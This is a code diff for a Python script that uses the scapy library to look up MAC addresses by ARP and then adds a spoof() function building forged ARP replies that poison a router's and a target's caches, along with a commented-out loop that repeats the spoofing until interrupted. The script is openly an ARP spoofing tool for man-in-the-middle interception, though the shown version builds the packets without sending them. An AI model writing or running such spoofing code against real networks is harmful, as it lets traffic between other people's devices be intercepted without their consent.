@@ -36,11 +36,29 @@ ROUTER_MAC = "84:26:15:f9:16:44"
 
 def get_mac_address(ip_address):
     broadcast_layer = scapy.Ether(dst=BROADCAST_MAC)
+    broadcast_layer.show()
+
     arp_layer = scapy.ARP(pdst=ip_address)
-    get_mac_packet = broadcast_layer/arp_layer
+    get_mac_packet = broadcast_layer / arp_layer
     answer, unanswer = scapy.srp(get_mac_packet, timeout=2, verbose=False)
     sent, received = answer[0]
     return received.hwsrc
+
+
+def spoof(router_ip, target_ip, router_mac, target_mac):
+    router_packet = scapy.ARP(
+        op=2,
+        psrc=target_ip,
+        hwdst=router_mac,
+        pdst=router_ip,
+    )
+
+    target_packet = scapy.ARP(
+        op=2,
+        psrc=router_ip,
+        hwdst=target_mac,
+        pdst=target_ip,
+    )
 
 
 target_mac = get_mac_address(target_ip)
@@ -48,3 +66,10 @@ router_mac = get_mac_address(router_ip)
 
 print(f"target: ip={target_ip}, mac={target_mac}")
 print(f"router: ip={router_ip}, mac={router_mac}")
+
+# try:
+#     while True:
+#         spoof(router_ip, target_ip, router_mac, target_mac)
+# except KeyboardInterrupt:
+#     print('Closing ARP spoofer')
+#     exit(0)
